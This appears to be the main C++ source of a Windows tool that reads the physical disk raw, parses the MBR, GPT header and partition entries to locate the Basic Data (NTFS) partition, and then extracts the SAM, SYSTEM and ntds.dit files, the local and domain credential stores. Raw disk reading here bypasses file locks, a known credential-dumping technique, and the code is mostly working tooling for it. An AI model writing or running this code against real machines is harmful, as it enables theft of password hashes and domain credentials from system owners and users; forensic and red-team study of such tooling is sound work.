#include <iostream>
#include <vector>
#include <string>
#include <stdexcept>
#include "DiskReader.h"
#include "NTFSParser.h"

#pragma pack(push, 1)
struct GPTHeader {
    char signature[8];
    DWORD revision;
    DWORD header_size;
    DWORD header_crc32;
    DWORD reserved;
    ULONGLONG current_lba;
    ULONGLONG backup_lba;
    ULONGLONG first_usable_lba;
    ULONGLONG last_usable_lba;
    BYTE disk_guid[16];
    ULONGLONG partition_entries_lba;
    DWORD num_partition_entries;
    DWORD partition_entry_size;
    DWORD partition_entries_crc32;
};

struct GPTPartitionEntry {
    BYTE partition_type_guid[16];
    BYTE unique_partition_guid[16];
    ULONGLONG starting_lba;
    ULONGLONG ending_lba;
    ULONGLONG attributes;
    WCHAR partition_name[36];
};
#pragma pack(pop)

int main() {
    try {
        DiskReader reader(L"\\\\.\\PhysicalDrive0");
        std::cout << "Successfully opened \\\\.\\PhysicalDrive0" << std::endl;

        LARGE_INTEGER offset;

        // Read MBR to check for GPT
        offset.QuadPart = 0;
        std::vector<BYTE> mbr = reader.read(offset, 512);

        if (mbr[0x1FE] != 0x55 || mbr[0x1FF] != 0xAA || mbr[450] != 0xEE) {
            throw std::runtime_error("Disk is not GPT formatted or MBR is invalid.");
        }
        std::cout << "Disk is formatted using GPT." << std::endl;

        // Read GPT header
        offset.QuadPart = 512;
        std::vector<BYTE> gptHeaderData = reader.read(offset, 512);
        GPTHeader* gptHeader = reinterpret_cast<GPTHeader*>(gptHeaderData.data());

        if (memcmp(gptHeader->signature, "EFI PART", 8) != 0) {
            throw std::runtime_error("Invalid GPT header.");
        }

        std::cout << "GPT Header found." << std::endl;
        std::cout << "Partition table starts at LBA: " << gptHeader->partition_entries_lba << std::endl;
        std::cout << "Number of partitions: " << gptHeader->num_partition_entries << std::endl;


        long long partitionTableOffset = gptHeader->partition_entries_lba * 512;
        uint32_t totalPartitionTableSize = gptHeader->num_partition_entries * gptHeader->partition_entry_size;
        offset.QuadPart = partitionTableOffset;
        std::vector<BYTE> partitionTableData = reader.read(offset, totalPartitionTableSize);

        uint64_t ntfsPartitionOffset = 0;

        for (DWORD i = 0; i < gptHeader->num_partition_entries; ++i) {
            GPTPartitionEntry* entry = reinterpret_cast<GPTPartitionEntry*>(
                partitionTableData.data() + i * gptHeader->partition_entry_size);


            bool isEmpty = true;
            for (int j = 0; j < 16; ++j) {
                if (entry->partition_type_guid[j] != 0) {
                    isEmpty = false;
                    break;
                }
            }
            if (isEmpty) continue;

            // Microsoft Basic Data Partition GUID
            BYTE basicDataGuid[16] = {
                0xA2, 0xA0, 0xD0, 0xEB, 0xE5, 0xB9, 0x33, 0x44,
                0x87, 0xC0, 0x68, 0xB6, 0xB7, 0x26, 0x99, 0xC7
            };

            if (memcmp(entry->partition_type_guid, basicDataGuid, 16) == 0) {
                std::wstring partitionName(entry->partition_name, 36);
                partitionName = partitionName.substr(0, partitionName.find(L'\0'));
                std::wcout << L"Found Basic Data Partition: '" << partitionName
                    << L"' | Starting LBA: " << entry->starting_lba << std::endl;


                ntfsPartitionOffset = entry->starting_lba * 512;

                break;
            }
        }


        if (ntfsPartitionOffset == 0) {
            throw std::runtime_error("Could not find a suitable NTFS partition.");
        }

        std::cout << "\n[*] Selected NTFS partition at offset: 0x" << std::hex << ntfsPartitionOffset << std::dec << std::endl << std::endl;


        NTFSParser parser(reader, ntfsPartitionOffset);

        std::vector<std::wstring> filesToExtract = {
            L"\\Windows\\System32\\config\\SAM",
            L"\\Windows\\System32\\config\\SYSTEM",
            L"\\Windows\\NTDS\\ntds.dit"
        };

        std::wcout << L"[*] Searching for target files..." << std::endl;
        parser.findAndExtractFiles(filesToExtract);

    }
    catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}